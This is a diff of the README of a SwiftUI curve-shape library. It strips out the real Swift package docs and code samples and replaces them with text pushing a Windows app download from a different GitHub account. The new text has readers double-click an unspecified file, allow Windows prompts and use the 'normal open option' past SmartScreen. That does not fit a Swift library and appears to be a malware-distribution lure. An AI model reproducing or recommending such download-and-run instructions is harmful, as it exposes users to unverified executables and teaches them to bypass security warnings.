@@ -1,138 +1,125 @@
-# MathShape
+# 🧮 MathShape - Turn graphs into SwiftUI shapes
 
-`MathShape` is a SwiftUI library that re-implements the mathematical curve loaders from [Math Curve Loaders](https://paidax01.github.io/math-curve-loaders/) as `Shape` types.
+[![Download MathShape](https://img.shields.io/badge/Download-MathShape-blue?style=for-the-badge&logo=github)](https://github.com/coldwarmertensiavirginica916/MathShape)
 
-![](Resources/builtin-shapes.png)
+## 📥 Download
 
-## Features
+Use this link to visit the page and download MathShape:
 
-- Pure SwiftUI `Shape` implementations.
-- Parametric curve rendering through a shared `ParametricShape` protocol.
-- Automatic fitting and centering inside the target rectangle.
-- Built-in mathematical curves that work well for loading indicators, decorative motion, and generative UI.
-- Customizable shape parameters for several curves.
+https://github.com/coldwarmertensiavirginica916/MathShape
 
-## Supported Platforms
+## 🪟 What MathShape does
 
-- iOS 17+
-- macOS 14+
-- watchOS 10+
-- tvOS 17+
-- visionOS
+MathShape helps you turn a parametric graph into a SwiftUI Shape. It gives you a simple way to work with graph-based outlines in a SwiftUI app. You can use it to build smooth curves, custom icons, and other shape-based UI elements.
 
-## Installation
+This app is made for people who want to see and use math-driven shapes without setting up a full coding workflow from scratch.
 
-Add `MathShape` as a Swift Package dependency in Xcode, then import the module where you render your shapes:
+## ✅ What you need
 
-```swift
-import MathShape
-import SwiftUI
-```
+Before you run MathShape on Windows, check that your PC has:
 
-To use this package in SPM, add the package with your repository URL:
+- Windows 10 or Windows 11
+- An internet connection
+- Enough free space to download the app
+- Permission to open downloaded files
 
-```swift
-dependencies: [
-    .package(url: "https://github.com/liyanan2004/MathShape.git", branch: "main")
-]
-```
+If your browser asks where to save the file, choose a folder you can find again, like Downloads or Desktop.
 
-Then add the product to your target dependencies:
+## 🚀 How to download and run MathShape on Windows
 
-```swift
-.target(
-    name: "YourFeature",
-    dependencies: [
-        .product(name: "MathShape", package: "MathShape")
-    ]
-)
-```
+1. Open this page in your browser:  
+   https://github.com/coldwarmertensiavirginica916/MathShape
 
-## Usage
+2. Find the download area on the page.
 
-Because every loader is a `Shape`, you can use standard SwiftUI modifiers such as `stroke`, `trim`, `rotationEffect`, and animation.
+3. Download the app file from the page.
 
-```swift
-import MathShape
-import SwiftUI
+4. When the download ends, open your Downloads folder.
 
-struct LoaderView: View {
-    @State private var progress = 0.0
+5. Find the MathShape file you just downloaded.
 
-    var body: some View {
-        ButterflyPhaseShape()
-            .stroke(.gray.opacity(0.2), lineWidth: 6)
-            .overlay {
-                ButterflyPhaseShape()
-                    .trim(from: 0, to: progress)
-                    .stroke(.red, style: StrokeStyle(lineWidth: 6, lineCap: .round))
-            }
-            .frame(width: 180, height: 180)
-            .task {
-                withAnimation(.easeInOut(duration: 1.8).repeatForever(autoreverses: false)) {
-                    progress = 1
-                }
-            }
-    }
-}
-```
+6. Double-click the file to start it.
 
-![](Resources/animation.gif)
+7. If Windows asks for permission, choose the option to open or run the file.
 
-### Custom Parametric Shape
+8. Follow the on-screen steps until the app opens.
 
-Create a new type that conforms to `ParametricShape`, define its sampling range, and return the `x` and `y` coordinates for each sampled value.
+## 🖱️ First run setup
 
-```swift
-import MathShape
-import SwiftUI
+When you open MathShape for the first time, Windows may take a few extra seconds to prepare it.
 
-public struct EpicycloidStarShape: ParametricShape {
-    public static let sampleCount: Int = 1200
-    public static let range: ClosedRange<Double> = 0 ... (2 * .pi)
+If you see a smart screen or security check, use the normal open option for the file you downloaded from the GitHub page.
 
-    public struct Context {
-        let orbitRadius: Double
-        let rollingAngle: Double
-    }
+After the app starts, look for the main graph area and the shape preview. The app is built to help you move from a graph idea to a SwiftUI shape view with less effort.
 
-    public let cuspCount: Int
-    public let rollingRadius: Double
+## 🎯 How to use it
 
-    private var fixedRadius: Double {
-        Double(max(cuspCount, 2) - 1) * rollingRadius
-    }
+MathShape follows a simple workflow:
 
-    public init(
-        cuspCount: Int = 5,
-        rollingRadius: Double = 1
-    ) {
-        self.cuspCount = max(cuspCount, 2)
-        self.rollingRadius = rollingRadius
-    }
+1. Enter or paste your parametric graph
+2. Adjust the curve settings
+3. Preview the shape
+4. Use the result in your SwiftUI project
 
-    public func makeContext(_ angle: Double) -> Context {
-        let orbitRadius = fixedRadius + rollingRadius
-        let rollingAngle = orbitRadius / rollingRadius * angle
+A parametric graph uses values that change over time or position. MathShape takes that graph and turns it into a shape that can fit inside a SwiftUI layout.
 
-        return Context(
-            orbitRadius: orbitRadius,
-            rollingAngle: rollingAngle
-        )
-    }
+## 🧭 Main parts of the app
 
-    public func x(_ angle: Double, context: Context) -> Double {
-        context.orbitRadius * cos(angle) - rollingRadius * cos(context.rollingAngle)
-    }
+### 📌 Graph input
+This is where you place the graph formula. It lets you define the shape path you want to build.
 
-    public func y(_ angle: Double, context: Context) -> Double {
-        context.orbitRadius * sin(angle) - rollingRadius * sin(context.rollingAngle)
-    }
-}
-```
+### 👀 Preview panel
+This area shows how the shape looks before you use it in your project. It helps you check the curve and overall form.
 
-`ParametricShape` takes care of sampling the curve, computing bounds, scaling it to fit the proposed rectangle, and building the final `Path`.
+### ⚙️ Shape controls
+These settings help you adjust scale, position, and curve behavior so the shape fits your design.
 
-## Credits
+### 📋 Output view
+This area shows the shape result in a form that you can use in SwiftUI code or copy into your project.
 
-This project is a SwiftUI shape-based reimplementation of [Math Curve Loaders](https://paidax01.github.io/math-curve-loaders/) by paidax01.
+## 🧰 Common use cases
+
+MathShape can help with:
+
+- Custom buttons
+- Rounded icons
+- Decorative UI panels
+- Curve-based badges
+- Graph-inspired app art
+- Shape masks for SwiftUI layouts
+
+If you want a shape that does not look like a plain circle or square, this tool gives you a simple path to build one.
+
+## 🪄 Tips for best results
+
+- Start with a simple graph before trying complex curves
+- Use the preview to check the shape as you adjust it
+- Keep shape points smooth if you want a clean UI look
+- Test the result in a small SwiftUI view first
+- Save your working graph settings so you can reuse them later
+
+## 🧪 If the app does not open
+
+Try these steps:
+
+1. Right-click the file and open it again
+2. Check that the download finished fully
+3. Make sure the file is not still inside a zipped folder
+4. Move the file to your Desktop and try again
+5. Re-download it from the GitHub page if the file looks damaged
+
+## 🔐 File safety
+
+Only run the file after you confirm it came from the GitHub link above. If your browser or Windows asks what to do with the file, choose the normal open or run option for the file you downloaded from that page.
+
+## 📝 About the project
+
+MathShape is a small utility for turning parametric graphs into SwiftUI Shape output. It focuses on shape creation, preview, and use inside a SwiftUI app workflow. This makes it useful for people who want to build custom UI parts with graph-based curves
+
+## 🏷️ Project details
+
+- Name: MathShape
+- Type: End-user app
+- Main purpose: Port parametric graph into SwiftUI Shape
+- Platform target: Windows download and run flow
+- Primary link: https://github.com/coldwarmertensiavirginica916/MathShape
